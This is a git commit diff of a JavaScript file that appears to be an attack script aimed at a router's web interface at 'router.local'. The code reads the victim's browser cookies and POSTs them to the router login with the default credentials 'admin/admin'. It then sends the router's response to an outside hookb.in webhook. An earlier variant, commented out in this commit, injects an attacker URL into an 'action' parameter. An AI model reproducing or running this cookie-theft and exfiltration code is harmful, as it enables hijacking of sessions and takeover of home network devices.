72978dd9987059e356752a968dd4eb3ad4590191
nastassiagoodson <60201494+nastassiagoodson@users.noreply.github.com>
2022-03-07 06:08:56 -0800

    Update index.js

--- index.js
+++ index.js
@@ -1,22 +1,22 @@
 const http = new XMLHttpRequest();
-//http.open('POST', 'http://router.local/login.php', true);
+http.open('POST', 'http://router.local/login.php', true);
 //http://router.local/home.php?action=view&
 //http://router.local/view.php
 const cook = document.cookie;
-http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
+//http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/yDwmxXwVbPtG9yjjwZPa', true);
+                xhr.open('POST', 'https://hookb.in/qB0N3JWw39sEwPllaGJZ', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
-                xhr.send(JSON.stringify(http.responseText));
+                xhr.send(JSON.stringify(http.responseURL));
 
 };
 
-http.send();
-//http.send(cook+"&username=admin&pin=admin&notRobot=on");
+//http.send();
+http.send(cook+"&username=admin&pin=admin&notRobot=on");
 
    
 
